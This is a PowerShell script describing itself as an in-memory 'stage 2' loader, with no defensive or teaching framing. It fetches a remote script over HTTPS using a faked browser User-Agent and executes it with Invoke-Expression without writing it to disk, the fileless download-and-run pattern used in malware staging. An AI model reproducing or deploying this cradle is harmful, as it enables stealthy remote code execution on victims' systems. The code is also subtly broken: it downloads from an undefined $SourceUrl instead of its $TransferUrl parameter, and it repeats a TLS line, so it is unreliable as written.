<#
.SYNOPSIS
    In-memory stage 2 script loader.

.DESCRIPTION
    Retrieves the stage 2 script as text and invokes it in the
    current session without writing the script to disk.

.EXAMPLE
    PS> .\stage2.ps1
#>
[CmdletBinding()]
param(
    [string]$TransferUrl = 'https://localhost:9001/stage2.ps1',
    [int]$StageTimeout = 75
)
$ErrorActionPreference = "Stop"

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $PayloadText = $ClientObject.DownloadString($SourceUrl)
    if ([string]::IsNullOrWhiteSpace($PayloadText)) {
        throw "Downloaded script was empty"
    }
    Write-Verbose ("Script length: " + $PayloadText.Length)
    Invoke-Expression $PayloadText
}
catch {
    Write-Warning "In-memory stage failed: $($_.Exception.Message)"
}

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
